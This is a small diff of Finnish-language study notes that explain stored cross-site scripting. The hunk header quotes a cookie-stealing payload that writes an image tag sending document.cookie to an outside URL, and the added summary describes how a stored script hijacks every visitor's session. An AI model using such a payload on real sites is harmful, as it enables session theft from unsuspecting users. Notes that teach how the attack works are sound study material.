@@ -27,7 +27,9 @@ document.write("<img scr="[URL]?c='+document.cookie+'" />');
 
 Kohde löytää saman linkin samaan blogi sivustoon, tämän avaamisen jälkeen skripti suoriutuu automaattisestin. Tällöin kohteen istunto menee hakkerin käislle, jonka jälkeen hakkeri saa kohteen istunnon käyttöön
 
-** **
+**Tiivistettynä**
+
+Hyökkääjä ajaa skriptin sivustolle, tämä jää sen tietokantaa. Sen jälkeen jokainen joka avaa kyseisen sivun skripti aktivoituu ja tiedot menevät hyökkääjälle
 
 ![image](https://user-images.githubusercontent.com/93308960/200964967-8d8ef754-3ccf-405f-bd04-2f2df10651cb.png)
 
